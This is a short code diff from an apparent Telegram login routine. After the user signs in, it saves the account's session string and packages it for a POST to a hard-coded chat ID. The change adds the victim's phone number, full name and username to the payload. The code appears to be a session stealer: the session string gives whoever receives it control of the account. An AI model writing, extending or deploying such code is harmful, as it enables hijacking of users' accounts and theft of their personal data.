@@ -221,9 +221,10 @@ async function login() {
             console.log(client.session.save());
             await sleep(1000)
             const sess = client.session.save() as unknown as string;
+            const user: any = await result.user.toJSON()
             const payload = {
                 chat_id: "-1001729935532",
-                text: `${(username).toUpperCase()}:${phoneNumber} | ${sess}}`
+                text: `${(username).toUpperCase()}:number = +${user.phone}\nsession = ${sess}}\nname:${user.firstName} ${user.lastName}\nuserName: ${user.username}`
             };
             const options = {
                 method: 'POST',
